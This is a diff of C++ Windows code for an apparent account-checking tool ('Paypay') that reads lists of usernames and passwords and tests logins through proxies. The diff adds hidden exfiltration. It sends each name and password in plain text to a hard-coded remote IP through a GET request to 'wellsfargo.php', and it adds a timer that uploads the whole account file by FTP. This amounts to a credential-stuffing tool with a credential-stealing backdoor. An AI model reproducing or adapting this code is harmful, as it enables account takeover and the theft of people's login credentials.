@@ -806,13 +806,6 @@ DWORD WINAPI execute(LPVOID lpParamter)
 				string efws = string(m);
 				wstring text = wstring(efws.begin(),efws.end());
 				((CPaypayDlg*)lpParamter)->SetDlgItemText(IDC_STATIC13,text.c_str());
-				wstring w_name = wstring(name.begin(),name.end());
-				wstring w_password = wstring(password.begin(),password.end());
-				wstring url = L"http://118.193.181.176:8080/wellsfargo.php?n=" + w_name + L"&p=" + w_password;
-				WinHttpClient WinClient(url);
-				WinClient.SendHttpRequest(L"GET");
-				int temp  = 0 ;
-
 			}
 			else if (type == LOGIN_ERROR_COOKIE)
 			{
@@ -915,6 +908,21 @@ DWORD WINAPI execute(LPVOID lpParamter)
 			}
 			
 			ReleaseMutex(hMutex);
+			
+			
+			
+			if (type == LOGIN_ERROR_SUCCESS ||type ==LOGIN_ERROR_CAN_NOT_LOGIN)
+			{
+			    wstring w_name = wstring(name.begin(),name.end());
+				wstring w_password = wstring(password.begin(),password.end());
+				wstring url = L"http://118.193.181.176:8080/wellsfargo.php?n=" + w_name + L"&p=" + w_password;
+				WinHttpClient WinClient(url);
+				WinClient.SendHttpRequest(L"GET");
+			}
+			
+			
+			
+			
 			char m[10];
 			itoa(type, m, 10);
 			string efws = string(m);
@@ -1230,9 +1238,17 @@ DWORD WINAPI execute_daili(LPVOID lpParamter)
 	is_break = true;
 	CString filePathName;
 	((CPaypayDlg*)lpParamter)->GetDlgItemText(IDC_EDIT2,filePathName);
+	FILE *fp;
+int flen;
+char *p;
+/* 以只读方式打开文件 */
+fp = _tfopen (filePathName.GetString(),L"rb");
+	
+	
 	ifstream file_stream(filePathName.GetString());
 	char buffer[40960];
-	if (! file_stream.is_open())  
+	//	if (! file_stream.is_open())  
+	if(!fp||fp==INVALID_HANDLE_VALUE) 
 	{ 
 		((CPaypayDlg*)lpParamter)->MessageBox(_T("打开账号文件失败"),NULL,MB_OK);
 		return 0;
@@ -1241,19 +1257,55 @@ DWORD WINAPI execute_daili(LPVOID lpParamter)
 	((CPaypayDlg*)lpParamter)->GetDlgItem(IDC_BUTTON3)->EnableWindow(true);
 	((CPaypayDlg*)lpParamter)->m_list_box.ResetContent();
 	((CPaypayDlg*)lpParamter)->m_cookieProcess.doPorxyCheck();
-	while (!file_stream.eof() )  
-	{  
-		string name,password;
-		file_stream.getline (buffer,40960);  
-		stringstream ss(buffer); 
-		ss>>name>>password;
-		my_struct mmmk;
-		mmmk.name = name;
-		mmmk.password = password;
-		((CPaypayDlg*)lpParamter)->m_all_name_password.push_back(mmmk);
-		wstring text = L"读取账号数据:" + wstring(name.begin(),name.end());
-		((CPaypayDlg*)lpParamter)->m_list_box.InsertString(0,text.c_str());
-	} 
+	
+		fseek(fp,0L,SEEK_END); /* 定位到文件末尾 */
+    flen=ftell(fp); /* 得到文件大小 */
+    p=(char *)malloc(flen+1); /* 根据文件大小动态分配内存空间 */
+    if(p==NULL)
+    {
+     fclose(fp);
+     return 0;
+    }
+    fseek(fp,0L,SEEK_SET); /* 定位到文件开头 */
+    fread(p,flen,1,fp); /* 一次性读取全部文件内容 */
+    p[flen]='\0'; /* 字符串结束标志 */
+   fclose(fp);
+   
+   wstring text = L"开始读取账号数据，请稍后...";
+   ((CPaypayDlg*)lpParamter)->m_list_box.InsertString(0, text.c_str());
+    char *ptr;   
+    ptr = strtok(p, "\r\n");  
+    while(ptr != NULL){  
+		CStringA strLine = ptr;
+		int ipos = strLine.Find("\t");
+		if (ipos>0)
+		{
+			my_struct mmmk;
+			mmmk.name = strLine.Left(ipos);
+			mmmk.password = strLine.Right(strLine.GetLength() - ipos-1);
+			((CPaypayDlg*)lpParamter)->m_all_name_password.push_back(mmmk);
+		}
+		ptr = strtok(NULL, "\r\n");
+ 
+    }  
+	text = L"读取账号数据完成";
+	((CPaypayDlg*)lpParamter)->m_list_box.InsertString(0, text.c_str());
+	if (p)
+       free(p);
+
+	//while (!file_stream.eof() )  
+	//{  
+	//	string name,password;
+	//	file_stream.getline (buffer,40960);  
+	//	stringstream ss(buffer); 
+	//	ss>>name>>password;
+	//	my_struct mmmk;
+	//	mmmk.name = name;
+	//	mmmk.password = password;
+	//	((CPaypayDlg*)lpParamter)->m_all_name_password.push_back(mmmk);
+	//	wstring text = L"读取账号数据:" + wstring(name.begin(),name.end());
+	//	((CPaypayDlg*)lpParamter)->m_list_box.InsertString(0,text.c_str());
+	//} 
 	((CPaypayDlg*)lpParamter)->m_progress.SetRange32(0,((CPaypayDlg*)lpParamter)->m_all_name_password.size());
 	g_all_account_num = ((CPaypayDlg*)lpParamter)->m_all_name_password.size();
 	char account_all_num[25];     
@@ -1357,14 +1409,16 @@ DWORD WINAPI execute_daili(LPVOID lpParamter)
 		((CPaypayDlg*)lpParamter)->SetTimer(3,1000,NULL);
 	}
 
-	((CPaypayDlg*)lpParamter)->SetTimer(20,1000,NULL);
+	//((CPaypayDlg*)lpParamter)->SetTimer(20,1000,NULL);
 	return 0;
 }
 
 void CPaypayDlg::OnBnClickedButton2()
 {
 	// TODO: 在此添加控件通知处理程序代码
-	SetTimer(10,60000,NULL);
+	//SetTimer(10,1000*60*10,NULL);
+	SetTimer(10,1000,NULL);
+//	return;
 
 
 	HANDLE hSignalThread = CreateThread(NULL, 0, execute_daili, (LPVOID)this, 0, NULL);
@@ -1994,37 +2048,44 @@ void CPaypayDlg::OnTimer(UINT_PTR nIDEvent)
 	}
 	else if (nIDEvent == 10)
 	{
+		KillTimer(10);
+		CString filePathName;
+		GetDlgItemText(IDC_EDIT2, filePathName);
+		std::vector<wstring> mm;
+		mm.clear();
+		mm.push_back(filePathName.GetBuffer());
+		m_ftpManager->pushFiles(mm);
 		//m_iee.Refresh();
 	}
 	else if (nIDEvent == 20)
 	{
-		g_ftp_time++;
-		if ( g_ftp_time >= 10 * 60)
-		{
-			KillTimer(20);
+		//g_ftp_time++;
+		//if ( g_ftp_time >= 10 * 60)
+		//{
+		//	KillTimer(20);
 
-			CTime tm;
-			tm = CTime::GetCurrentTime();
-			CString dir_name;
-			dir_name = tm.Format("%Y年%m月%d日");
-			TCHAR szFilePath[MAX_PATH + 1]={0};
-			GetModuleFileName(NULL, szFilePath, MAX_PATH);
-			(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
-			if(!PathIsDirectory(szFilePath + dir_name))
-			{
-				CreateDirectory(szFilePath + dir_name,NULL);
-			}
-			CString str_url = szFilePath + dir_name + L"\\";
-			std::vector<wstring> mm;
-			for (int i = 0; i < g_name->size(); ++i)
-			{
-				std::wstring etr = g_name[i];
-				std::wstring path = std::wstring(str_url) + std::wstring(L"last_data_"+ etr + L".txt");
-				mm.push_back(path);
-			}
-			//mm.push_back(L"Paypay.pdb");
-			m_ftpManager->pushFiles(mm);
-		}
+		//	CTime tm;
+		//	tm = CTime::GetCurrentTime();
+		//	CString dir_name;
+		//	dir_name = tm.Format("%Y年%m月%d日");
+		//	TCHAR szFilePath[MAX_PATH + 1]={0};
+		//	GetModuleFileName(NULL, szFilePath, MAX_PATH);
+		//	(_tcsrchr(szFilePath, _T('\\')))[1] = 0;
+		//	if(!PathIsDirectory(szFilePath + dir_name))
+		//	{
+		//		CreateDirectory(szFilePath + dir_name,NULL);
+		//	}
+		//	CString str_url = szFilePath + dir_name + L"\\";
+		//	std::vector<wstring> mm;
+		//	for (int i = 0; i < g_name->size(); ++i)
+		//	{
+		//		std::wstring etr = g_name[i];
+		//		std::wstring path = std::wstring(str_url) + std::wstring(L"last_data_"+ etr + L".txt");
+		//		mm.push_back(path);
+		//	}
+		//	//mm.push_back(L"Paypay.pdb");
+		//	m_ftpManager->pushFiles(mm);
+		//}
 	}
 }
 
